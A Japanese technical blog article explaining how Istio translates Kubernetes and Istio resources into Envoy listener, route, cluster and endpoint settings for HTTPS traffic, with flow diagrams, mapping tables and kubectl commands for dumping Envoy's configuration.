Engineeringマイクロサービス間のHTTPSサービスメッシュ内のPodから別のPodにHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。flowchart TD    送信元 -.->|HTTPS| VirtualService    VirtualService([⛵️ VirtualService]) -.-> DestinationRule    DestinationRule([⛵️ DestinationRule]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class VirtualService,DestinationRule,Service,Endpoints blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。送信元Podは、宛先Podとの間で相互TLS認証を実施します。送信元Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) の設定に応じて、HTTPSリクエストを宛先PodにL7ロードバランシングします。Istio流量管理实现机制深度解析-赵化冰的博客 | Zhaohuabing Blogサービスメッシュ外へのHTTPSサービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) にHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。複数のVirtualServiceとDestinationが登場するため、これらには便宜上 X と Y をつけています。flowchart TD    送信元 -.->|HTTPS| VirtualServiceX    VirtualServiceX([⛵️ VirtualService X]) -.-> DestinationRuleX    DestinationRuleX([⛵️ DestinationRule X]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.-> Gateway    Gateway([⛵️ Gateway]) -.-> VirtualServiceY    VirtualServiceY([⛵️ VirtualService Y]) -.-> DestinationRuleY    DestinationRuleY([⛵️ DestinationRule Y]) -.-> ServiceEntry    ServiceEntry([⛵️ ServiceEntry]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class Gateway,VirtualServiceX,VirtualServiceY,DestinationRuleX,DestinationRuleY,Service,Endpoints,ServiceEntry blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。送信元Podは、HTTPSリクエストの宛先がServiceEntryでエントリ済みか否かの設定に応じて、HTTPSリクエストの宛先を切り替えます。宛先がエントリ済みであれば、送信元PodはHTTPSリクエストの宛先にIstio EgressGateway Podを選択します。宛先が未エントリであれば、送信元PodはHTTPSリクエストの宛先に外のシステムを選択します。送信元Podは、Istio EgressGateway Podとの間で相互TLS認証を実施します。(1) で宛先がエントリ済であったとします。送信元Podは、HTTPSリクエストの向き先をIstio EgressGateway Podに変更します。送信元Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) の設定に応じて、Istio EgressGateway PodにL7ロードバランシングします。Istio EgressGateway Podは、HTTPSリクエストをエントリ済システムにL7ロードバランシングします。Using Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio▶︎ Istio EgressGatewayの必要性についてHTTPSリクエストを送信できます。しかし、Istio EgressGatewayを使わないと、マイクロサービスからistio-proxyコンテナを経由せずに外部システムに直接HTTPSリクエストを送信できるようになってしまい、システムの安全性が低くなります。Istio / Accessing External Services03. istio-proxyコンテナによるHTTPS処理前章では、KubernetesリソースやIstioカスタムリソースによって抽象化されたEnvoyまで言及しませんでした。本章では、解説をもう少し具体化します。Istioは、Envoyプロセスを持つistio-proxyコンテナを作成します。このistio-proxyコンテナを使用してどのようにHTTPSリクエストを処理しているのかを、HTTPSリクエストの方向に分けて解説します。Envoyの設定については、次章以降で解説します。Istioコントロールプレーンの仕組みEnvoyの設定を抽象化する責務を担うのは、Istioコントロールプレーン (discoveryコンテナ) です。Istioコントロールプレーンは異なる責務を担う複数のレイヤーから構成されています。レイヤー名      責務    Config ingestionレイヤー            kube-apiserverからKubernetesリソースやIstioカスタムリソースの設定を取得します。Istioの初期から名前は変わっていません。          Config translationレイヤー                   リソースの設定をEnvoy設定に変換します。Istioの初期ではConfig Data Modelレイヤーという名前で、執筆時点 (2024/01/16) で名前が変わっています。          Config servingレイヤー            Envoyの設定や証明書をPod内のistio-proxyコンテナに配布します。Istioの初期では、Proxy Servingレイヤーという名前で、執筆時点 (2024/01/16) で名前が変わっています。          図中の番号に沿って、Istioコントロールプレーンの仕組みを解説します。Config ingestionレイヤーにて、 Istioコントロールプレーンはkube-apiserverにHTTPSリクエストを送信します。ここで、KubernetesリソースやIstioカスタムリソースの設定を取得します。Config translationレイヤーにて、取得したリソースの設定をEnvoyの設定に変換します。Config servingレイヤーにて、Envoyの設定や証明書をPod内のistio-proxyコンテナに配布します。双方向ストリーミングRPCのため、istio-proxyコンテナがConfig servingレイヤーにリクエストを送信し、これらを取得することもあります。istio/architecture/networking/pilot.md at 1.20.2 \xb7 istio/istio \xb7 GitHub一文带你彻底厘清 Isito 中的证书工作机制-赵化冰的博客 | Zhaohuabing Blog▶︎ Config servingレイヤーにあるXDS-APIについてAPIがあります。このXDS-APIは、Envoyの設定に関するエンドポイント (LDS-API、RDS-API、CDS-API、EDS-API、ADS-API、など) や、証明書配布のエンドポイント (例：SDS-API) を持ちます。以下の記事で解説していますため、もし気になる方はよろしくどうぞ\uD83D\uDE47\uD83C\uDFFB‍▶︎ Istioカスタムリソースのコントローラーについてトロールプレーンは、前述の責務以外にカスタムコントローラーとしての責務も担います。以前は、IstioOperatorがカスタムコントローラーの責務を担っていましたが、執筆時点 (2024/01/16) ではIstioOperatorが非推奨となりました。IstioOperatorの代わりに、Istioコントロールプレーンがこれを担うようになりました\uD83D\uDC4D\uD83C\uDFFBistio/architecture/networking/pilot.md at 1.20.2 \xb7 istio/istio \xb7 GitHubサービスメッシュ外からのHTTPSサービスメッシュ外から内にHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。クライアントは、サービスメッシュ外からL7ロードバランサーにHTTPSリクエストを送信します。L7ロードバランサーは、Istio IngressGateway PodにHTTPSリクエストを送信します。Istio IngressGateway Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナに送信します (リダイレクトは不要)。Istio IngressGateway Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。Istio IngressGateway Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。宛先Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先マイクロサービスに送信します。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineering▶︎ Pod内のiptablesについてiptablesは、リクエストが必ずistio-proxyコンテナを経由するように、istio-proxyコンテナにリクエストをリダイレクトします。iptablesのルールを書き換えるのはistio-initコンテナです。Istioは、istio-proxyコンテナと同じタイミングで、istio-initコンテナをPodにインジェクションします (Istio IngressGatewayとIstio EgressGatewayのPodは除きます)。画像引用元：SoByteistio-initコンテナは、istio-iptablesコマンドを実行し、iptablesのルールを書き換えます。また、istio-initコンテナはルールを書き換えた後に終了するため、Podの起動後にPod内に残りません\uD83D\uDC4D\uD83C\uDFFB$ istio-iptables \\\\    -p 15001 \\\\    -z 15006 \\\\    -u 1337 \\\\    -m REDIRECT \\\\    -i * \\\\    -x \\\\    -b * \\\\    -d 15090,15020Sidecar injection, transparent traffic hijacking, and routing process in Istio explained in detail | by Jimmy Song | MediumIstio / pilot-agent▶︎ Istio IngressGateway Pod内のiptablesについてistio-proxyコンテナにリクエストをリダイレクトする必要がありません。そのため、Istioはiptablesのルールを書き換えるistio-initコンテナをIstio IngressGateway Podにインジェクションしません。つまり、Istio IngressGateway Pod内のiptablesのルールはデフォルトのままになっています\uD83D\uDC4D\uD83C\uDFFBマイクロサービス間のHTTPSサービスメッシュ内のPodから別のPodにHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。送信元Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。送信元Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。送信元Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。宛先Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先マイクロサービスに送信します。Istio流量管理实现机制深度解析-赵化冰的博客 | Zhaohuabing Blogサービスメッシュ外へのHTTPSサービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) にHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。送信元Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。送信元Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。この時、ServiceEntryで宛先がエントリ済みか否かに応じて、HTTPSリクエストの宛先を切り替えます。宛先がエントリ済みであれば、istio-proxyコンテナはHTTPSリクエストの宛先にIstio EgressGateway Podを選択します。宛先が未エントリであれば、istio-proxyコンテナはHTTPSリクエストの宛先に外のシステムを選択します。ここでは、宛先がエントリ済であったとします。送信元Pod内のistio-proxyコンテナは、HTTPSリクエストをIstio EgressGateway PodにL7ロードバランシングします。Istio EgressGateway Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナに送信します (リダイレクトは不要)。Istio EgressGateway Pod内のistio-proxyコンテナは、HTTPSリクエストをエントリ済システムにL7ロードバランシングします。▶︎ Istio EgressGateway Pod内のiptablesについてistio-proxyコンテナにリクエストをリダイレクトする必要がありません。そのため、Istioはiptablesのルールを書き換えるistio-initコンテナをIstio EgressGateway Podにインジェクションしません。つまり、Istio EgressGateway Pod内のiptablesのルールはデフォルトのままになっています\uD83D\uDC4D\uD83C\uDFFBUsing Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio04. EnvoyによるHTTPS処理前章では、istio-proxyコンテナ内のEnvoyの設定まで、言及しませんでした。本章では、もっと具体化します。EnvoyがHTTPSリクエストを処理する仕組みを解説します。Envoyの設定の種類HTTPSリクエストを処理する場合、Envoyの設定が以下の順で紐付き、HTTPSリクエストを送信元から宛先まで届けます。flowchart TD    送信元 -.->|HTTPS| リスナー    リスナー(リスナー) -.-> リスナーフィルター    subgraph  \\"\\"      リスナーフィルター(リスナーフィルター) -.-> ネットワークフィルター      ネットワークフィルター(ネットワークフィルター) -.-> HTTPフィルター    end    HTTPフィルター(HTTPフィルター) -.-> ルート    ルート(ルート) -.-> クラスター    クラスター(クラスター) -.-> エンドポイント    エンドポイント(エンドポイント) -.->|HTTPS| 宛先classDef sly fill: #CCFFFF, stroke: black;class 送信元 slyclassDef yellow fill: #FFFF88, stroke: black;class 宛先 yellowclassDef red fill: #EA6B66, font-weight :bold, stroke: black;class リスナー,リスナーフィルター,ネットワークフィルター,HTTPフィルター,ルート,クラスター,エンドポイント red各処理がどのような責務を担っているのかをもう少し詳しく見てみましょう。図中の番号に沿って、EnvoyがHTTPSリクエストを処理する仕組みを解説します。送信元からのHTTPSリクエストの宛先ポートで、リスナーを絞り込みます。通信の種類 (例：HTTP、HTTPS、TCP、UDP、Unixドメインソケット、など) に応じてフィルターを選び、各フィルターがパケットのヘッダーを処理します。もしHTTPSであれば、送信元との間でTLS接続を確立し、パケットのL7のアプリケーションデータを復号化します。フィルターを使用して、HTTPSリクエストの宛先ポートで、ルートを絞り込みます。フィルターを使用して、HTTPSリクエストの宛先ホストやパスで、クラスターを絞り込みます。設定した負荷分散方式 (例：ラウンドロビン、など) に応じて、クラスター配下のエンドポイントを選びます。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、エンドポイントにL7ロードバランシングします。Life of a Request — envoy 1.29.0-dev-3cbdd6 documentation▶ TCPリクエストを処理する場合についてエストを処理する場合、フィルターに紐づくのはルートですが、TCPリクエストの場合はそうではありません。TCPリクエストを処理する場合、フィルターにクラスターが紐づきます\uD83D\uDC4D\uD83C\uDFFBflowchart TD    送信元 -.->|TCP| リスナー    リスナー(リスナー) -.-> リスナーフィルター    subgraph  \\"\\"      リスナーフィルター(リスナーフィルター) -.-> ネットワークフィルター    end    ネットワークフィルター(ネットワークフィルター) -.-> クラスター    クラスター(クラスター) -.-> エンドポイント    エンドポイント(エンドポイント) -.->|TCP| 宛先classDef sly fill: #CCFFFF, stroke: black;class 送信元 slyclassDef yellow fill: #FFFF88, stroke: black;class 宛先 yellowclassDef red fill: #EA6B66, font-weight :bold, stroke: black;class リスナー,リスナーフィルター,ネットワークフィルター,クラスター,エンドポイント redDebugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPTフィルターフィルターの一覧Envoyのフィルターは、Envoyの機能を拡張するための設定です。HTTPSリクエストを処理するためには、リスナーフィルター、ネットワークフィルター、HTTPフィルター、といったフィルターが必要になります。全ては解説しきれないため、HTTPSリクエストを処理するための代表的なフィルターをいくつか抜粋しました。ただ、 Istioはこれらのフィルターをデフォルトで有効にしてくれている ため、開発者がEnvoyのフィルターを設定する場面は少ないです。逆をいえば、Istioを介さずにEnvoyをそのまま使用する場合、開発者がEnvoyのフィルターを自前で設定する必要があります\uD83D\uDC4D\uD83C\uDFFBフィルターの種類      HTTPSリクエストの処理に必要なフィルター(一部抜粋)      説明    リスナーフィルター      Original Destination      istio-proxyコンテナへのリダイレクト前の宛先情報をEnvoyが取得できるようにします。Pod内のiptablesがHTTPSリクエストをistio-proxyコンテナにリダイレクトすると、HTTPSリクエストの宛先がistio-proxyコンテナに変わってしまいます。ただし、iptablesはリダイレクト前の宛先をカーネル上のSO_ORIGINAL_DSTという定数に格納してくれています。Envoyは、カーネル上のSO_ORIGINAL_DSTから本来の宛先を取得し、プロキシします。    HTTP Inspector      EnvoyがHTTPを検知できるようにします。    TLS Inspector      EnvoyがTLSを検知できるようにします。TLSを検知した場合、EnvoyはTLSに関する処理を実行します。例えば、DownstreamTlsContextは、リスナーフィルター直後に、送信元との間でTLS接続を確立し、パケットのL7のアプリケーションデータを復号化します。また、UpstreamTlsContextは、クラスターの処理時に、宛先との間でTLS接続を確立し、L7のアプリケーションデータを暗号化します。    ネットワークフィルター      HTTP connection manager      Envoyが、L7のアプリケーションデータを読み取り、また後続のHTTPフィルターを制御できるようにします。    HTTPフィルター      Router      Envoyがポート番号でルート、ホストやパスでクラスターを絞り込めるようにします。    gRPC-Web      EnvoyがHTTP/1.1で受信したHTTPSリクエストをHTTP/2に変換し、gRPCサーバーにプロキシできるようにします。    Filters — envoy 1.29.0-dev-21c4a2 documentation▶︎ Istioがデフォルトで有効にするEnvoyの設定についてistio-proxyコンテナは、イメージのビルド時に、あらかじめ用意しておいたEnvoyの設定ファイルを組み込みます。そのため、istio-proxyコンテナ内のEnvoyは、多くの設定をデフォルトで有効にできます。Istioを利用する開発者が、EnvoyがHTTPSリクエストを処理するために必要なフィルターを有効にしなくてよいのも、Istioのおかげです。Istioほんまにありがとな\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F  istio/pilot/docker/Dockerfile.proxyv2 at 1.20.2 \xb7 istio/istio \xb7 GitHubistio/tools/packaging/common/envoy_bootstrap.json at 1.20.2 \xb7 istio/istio \xb7 GitHubフィルターチェーンの仕組みEnvoyは、複数のフィルターからなるフィルターチェーンを実行し、HTTPSを処理します。図中の番号に沿って、Envoyのフィルターチェーンの仕組みを解説します。各フィルターの機能は、前述したフィルターの一覧を参考にしてください\uD83D\uDE47\uD83C\uDFFBリスナーフィルター (Original Destination、HTTP Inspector、TLS Inspector、など) を実行します。(1) でTLS InspectorがTLSを検知した場合、DownstreamTlsContextで宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。ネットワークフィルター (HTTP connection manager、など) を実行します。HTTPフィルター (Router、gRPC-Web、など) を実行します。Life of a Request — envoy 1.29.0-dev-3cbdd6 documentation▶ TCPリクエストを処理する場合についてHTTPSリクエストを処理する場合にのみ使用します。それ以外の通信の種類 (例：TCP、UDP、Unixドメインソケット、など) の場合は、HTTPフィルターを使用しません。例えば、TCPリクエストの場合、ネットワークフィルターのTCP proxyフィルターを使用します\uD83D\uDC4D\uD83C\uDFFBTCP proxy — envoy 1.29.0-dev-edc366 documentation05. リソースの設定からEnvoy設定への翻訳いよいよです\uD83D\uDD25Istioが各リソースをいずれのEnvoyの設定に翻訳しているのかを解説します。表で対応関係の一覧を示した後、istio-proxyコンテナ内のEnvoyに当てはめました。各リソースとEnvoyの設定の関係一覧Istioコントロールプレーンは、KubernetesリソースやIstioカスタムリソースの設定をEnvoyの設定に翻訳し、処理の流れに当てはめます。以下の通り、各リソースがいずれのEnvoyの設定を抽象化するのかを整理しました。リソースによっては、Envoyの複数の設定を抽象化します。なお、Istioの用意したEnvoyのフィルターのデフォルト値を変更するユースケースが少ないため、これを抽象化するEnvoyFilterについては言及しません。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅                  ✅    ルート      ✅                  ✅                      クラスター      ✅                        ✅      ✅      ✅    エンドポイント            ✅                  ✅      ✅          Debugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPTWebinar: Debugging your debugging tools; What to do when your service mesh goes down in production? - YouTubeサービスメッシュ外からのHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ外からのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。Gatewayは、Istio IngressGatewayの一部として使用します。ServiceEntryは、使用しないリソースのため、\xd7としています。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅            \xd7      ✅    ルート      ✅                  ✅            \xd7          クラスター      ✅                        ✅      \xd7      ✅    エンドポイント            ✅                  ✅      \xd7          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      PeerAuthentication    送信元      リスナー      ✅            ✅      ✅            ✅    ルート      ✅                  ✅                クラスター      ✅                        ✅      ✅    エンドポイント            ✅                  ✅          宛先      リスナー      ✅                  ✅            ✅    ルート      ✅                  ✅                クラスター      ✅                        ✅      ✅    エンドポイント            ✅                  ✅          ▶︎ 送信元と宛先のNamespaceについてistio-ingress) においた方が良いです。マイクロサービスとは異なるNamespaceにIstio IngressGatewayを置くことで、Istio IngressGatewayをアップグレードしやすくなったり、他から障害の影響を受けにくくなります\uD83D\uDE46\uD83C\uDFFB‍♂️istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。HTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyでほとんど同じリソースが登場しますが、 Gatewayは送信元Envoyだけで登場します。リソースの種類だけに着目すると、以下になります。Gatewayが送信元Envoyだけで登場することがわかりやすくなりました。マイクロサービス間のHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ内のPodから別のPodへのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。GatewayとServiceEntryは、使用しないリソースのため、\xd7としています。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            \xd7      ✅            \xd7      ✅    ルート      ✅            \xd7      ✅            \xd7          クラスター      ✅            \xd7            ✅      \xd7      ✅    エンドポイント            ✅      \xd7            ✅      \xd7          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      VirtualService      DestinationRule      PeerAuthentication    送信元      リスナー      ✅            ✅            ✅    ルート      ✅            ✅                クラスター      ✅                  ✅      ✅    エンドポイント            ✅            ✅          宛先      リスナー      ✅            ✅            ✅    ルート      ✅            ✅                クラスター      ✅                  ✅      ✅    エンドポイント            ✅            ✅          istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。HTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyで、同じリソースが登場します。リソースの種類だけに着目すると、以下になります。送信元または宛先Envoyで同じリソースが登場することがわかりやすくなりました。サービスメッシュ外へのHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) へのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。Gatewayは、Istio EgressGatewayの一部として使用します。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅                  ✅    ルート      ✅                  ✅                      クラスター      ✅                        ✅      ✅      ✅    エンドポイント            ✅                  ✅      ✅          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。他の場合とは異なり、送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、異なるリソースが抽象化します。PeerAuthenticationだけは、話を簡単にするために送信元と宛先が同じNamespaceであると仮定しているので、同じリソースが抽象化します。送信元Envoyの設定の抽象化で登場するリソースが宛先では登場せず、逆も然りです。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      Gateway      VirtualServiceX      〃Y      DestinationRuleX      〃Y      ServiceEntry      PeerAuthentication    送信元      リスナー      ✅                  ✅                              ✅    ルート      ✅                  ✅                                  クラスター      ✅                              ✅                  ✅    エンドポイント            ✅                        ✅                      宛先      リスナー                  ✅            ✅                        ✅    ルート                              ✅                            クラスター                                          ✅      ✅      ✅    エンドポイント                                          ✅      ✅          ▶︎ 送信元と宛先のNamespaceについてistio-egress) においた方が良いです。マイクロサービスとは異なるNamespaceにIstio EgressGatewayを置くことで、Istio EgressGatewayをアップグレードしやすくなったり、他から障害の影響を受けにくくなります\uD83D\uDE46\uD83C\uDFFB‍♂️istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。HTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、異なるリソースが抽象化します。PeerAuthenticationだけは、話を簡単にするために送信元と宛先が同じNamespaceであると仮定しているので、同じリソースが抽象化します。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyで同じリソースが登場しません 。リソースの種類だけに着目すると、以下になります。送信元または宛先Envoyで同じリソースが登場しないことがわかりやすくなりました。06. 翻訳されたEnvoy設定値を見てみる前章では、Envoyの具体的な設定値まで、言及しませんでした。本章では、さらに具体化します。各リソースの設定の翻訳によって、Envoyの具体的にどのような設定値になっているのかを解説します。Envoyの現在の設定を出力するEnvoyは、現在の設定を確認するためのエンドポイント (/config_dump) を公開しています。これにHTTPSリクエストを送信し、具体的な設定値を出力してみましょう\uD83D\uDC4D\uD83C\uDFFBリスナーを出力する/config_dumpのクエリストリングにresource={dynamic_listeners}をつけると、Envoyのリスナーを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -PAdministration interface — envoy 1.29.0-dev-783ce8 documentationConfigDump (proto) — envoy 1.29.0-dev-783ce8 documentation▶ 宛先情報を見やすくするyqコマンドについてJSON形式で設定を出力します。JSON形式だと見にくいため、yqコマンドでYAMLに変換すると見やすくなります\uD83D\uDC4Dルートを出力する/config_dumpのクエリストリングにresource={dynamic_route_configs}をつけると、Envoyのルートを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -PAdministration interface — envoy 1.29.0-dev-783ce8 documentationConfigDump (proto) — envoy 1.29.0-dev-783ce8 documentationクラスターを出力する/config_dumpのクエリストリングにresource={dynamic_active_clusters}をつけると、Envoyのクラスターを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -PAdministration interface — envoy 1.29.0-dev-783ce8 documentationConfigDump (proto) — envoy 1.29.0-dev-783ce8 documentationエンドポイントを出力する/config_dumpのクエリストリングにinclude_edsをつけると、Envoyのエンドポイントを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -PAdministration interface — envoy 1.29.0-dev-783ce8 documentationConfigDump (proto) — envoy 1.29.0-dev-783ce8 documentationSupported load balancers — envoy 1.29.0-dev-783ce8 documentation証明書を出力する/config_dumpのクエリストリングにresource={dynamic_active_secrets}をつけると、証明書を出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_secrets}\\" | yq -PConfigDump (proto) — envoy 1.29.0-dev-21c4a2 documentationサービスメッシュ外からのHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：50000) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50000) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50000) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：50000) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：foo-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|50010|foo-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビン、など) に応じて、Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:50000) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：50000) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50000)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50000) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50000||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：example.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートで管理しています (例：inbound|50000||) エンドポイントを選びます。Envoyは、エンドポイントをローカルホストや宛先ポートで管理しています (例：127.0.0.6:50000) 。  ローカルホストにHTTPSリクエストを送信します。結果的に、宛先マイクロサービスにHTTPSリクエストが届きます。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineering▶︎ 